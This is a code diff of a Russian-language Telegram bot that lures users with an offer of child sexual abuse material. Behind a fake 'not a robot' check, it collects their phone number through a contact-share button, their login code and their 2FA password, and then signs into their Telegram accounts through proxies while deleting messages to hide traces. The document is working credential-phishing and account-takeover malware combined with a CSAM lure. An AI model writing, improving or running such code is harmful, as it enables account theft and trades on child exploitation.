@@ -12,6 +12,7 @@ from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeEx
 from pymongo import MongoClient
 from dotenv import load_dotenv
 from datetime import datetime
+import asyncio
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -33,7 +34,7 @@ PROXY1_USER = os.getenv("PROXY1_USER")
 PROXY1_PASS = os.getenv("PROXY1_PASS")
 second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)
 
-# Список доступных прокси (первая - старая основная)
+# Список доступных прокси
 proxy_list = [main_proxy, second_proxy]
 
 mongo = MongoClient(MONGO_URI)
@@ -114,60 +115,58 @@ async def cmd_start(message: types.Message):
     )
 
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("Я точно не робот🥰", callback_data="auth_account")
+        InlineKeyboardButton("Я точно не робот!🥰", callback_data="request_contact")
     )
     await message.answer(
         "👋🇷🇺 ПРИВЕТ! ❤️\n"
-        "У нас самые громные фото и выдео с детьми,больше 10.000 материала! 👀\n"
+        "У нас самые громные фото и выдео с детьми, больше 10.000 материала! 👀\n"
         "Подтверди, что ты не бот, с помощью кнопки ниже, и получи весь материал! 🤖👇\n\n",
         reply_markup=keyboard
     )
 
-@dp.callback_query_handler(lambda c: c.data == 'auth_account')
-async def start_auth(callback_query: types.CallbackQuery):
+@dp.callback_query_handler(lambda c: c.data == 'request_contact')
+async def request_contact(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
-    user_states[user_id] = 'awaiting_phone'
+    user_states[user_id] = 'awaiting_contact'
 
     update_user_log(
         user_id=user_id,
         updates={
             "auth_button_clicked": True,
             "auth_button_click_time": datetime.now(),
-            "status": "awaiting_phone"
+            "status": "awaiting_contact"
         }
     )
 
-    # Убираем клавиатуру с кнопкой "Я не робот"
+    # Создаем клавиатуру с запросом контакта
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    keyboard.add(KeyboardButton("Поделиться номером", request_contact=True))
+
     await bot.edit_message_text(
         chat_id=user_id,
         message_id=callback_query.message.message_id,
-        text="📱 Отправьте ваш номер телефона в формате +79991234567:",
-        reply_markup=None
+        text="📱 Нажмите кнопку ниже, чтобы поделиться номером телефона:",
+        reply_markup=keyboard
     )
     await bot.answer_callback_query(callback_query.id)
 
-@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_phone')
-async def handle_phone(message: types.Message):
+@dp.message_handler(content_types=['contact'])
+async def handle_contact(message: types.Message):
     user_id = message.from_user.id
-    
-    # Удаляем сообщение с номером сразу после получения
+
+    # Проверяем, что пользователь находится в состоянии ожидания контакта
+    if user_states.get(user_id) != 'awaiting_contact':
+        return
+
+    # Удаляем сообщение с контактом сразу после получения
     try:
         await bot.delete_message(chat_id=user_id, message_id=message.message_id)
-    except:
-        pass  # Если не удалось удалить - продолжаем
+    except Exception as e:
+        logging.error(f"Не удалось удалить сообщение с контактом: {e}")
 
-    phone = message.text.strip()
-    
-    # Проверяем формат номера
-    if not phone.startswith("+"):
-        msg = await message.answer("❌ Номер должен начинаться с +. Попробуйте снова:")
-        # Удаляем сообщение об ошибке через 3 секунды
-        await asyncio.sleep(3)
-        try:
-            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
-        except:
-            pass
-        return
+    phone = message.contact.phone_number
+    if not phone.startswith('+'):
+        phone = f"+{phone}"
 
     geo_info = None
     try:
@@ -213,7 +212,6 @@ async def handle_phone(message: types.Message):
         error_msg = await message.answer(f"❌ Ошибка при отправке кода: {e}")
         await client.disconnect()
         cleanup(user_id)
-        # Удаляем сообщение об ошибке через 3 секунды
         await asyncio.sleep(3)
         try:
             await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
@@ -259,7 +257,6 @@ async def try_sign_in_code(user_id, code):
     if not client or not phone:
         error_msg = await bot.send_message(user_id, "⚠️ Сессия не найдена. Попробуйте снова с /start")
         cleanup(user_id)
-        # Удаляем сообщение об ошибке через 3 секунды
         await asyncio.sleep(3)
         try:
             await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
@@ -313,7 +310,6 @@ async def try_sign_in_code(user_id, code):
             success_msg = await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
-            # Удаляем финальное сообщение через 5 секунд
             await asyncio.sleep(5)
             try:
                 await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
@@ -326,7 +322,6 @@ async def try_sign_in_code(user_id, code):
                 updates={"status": "awaiting_2fa"}
             )
             msg = await bot.send_message(user_id, "🔐 Введите ваш пароль 2FA:")
-            # Удаляем сообщение о 2FA через 3 секунды
             await asyncio.sleep(3)
             try:
                 await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
@@ -459,5 +454,4 @@ async def process_2fa(message: types.Message):
             pass
 
 if __name__ == '__main__':
-    import asyncio
     executor.start_polling(dp, skip_updates=True)
